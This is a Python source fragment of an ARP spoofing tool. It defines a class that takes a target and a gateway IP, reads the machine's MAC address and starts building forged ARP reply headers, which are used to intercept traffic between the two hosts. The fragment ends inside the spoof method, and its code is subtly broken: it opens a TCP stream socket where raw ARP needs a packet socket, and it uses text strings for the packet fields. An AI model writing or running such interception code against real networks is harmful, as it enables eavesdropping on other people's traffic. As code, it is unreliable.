import socket
import struct
import binascii
from uuid import getnode


class ArpSpoofer:
    """
    Class to provide an interface for the arpspoofer

    """

    def __init__(self, target, gateway):
        """
        target => target ip
        gateway => gateway ip
        mac => system mac address

        """
        self.mac = ":".join(("%012X" % getnode())[i : i + 2] for i in range(0, 12, 2))
        self.target = target
        self.gateway = gateway

    def spoof(self):

        code = "\x08\x06"
        htype = "\x00\x01"
        protype = "\x08\x00"
        hsize = "\x06"
        psize = "\x04"
        opcode = "\x00\x02"

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.htons(0x0800))
        s.bind(("eth0", socket.htons(0x0800)))
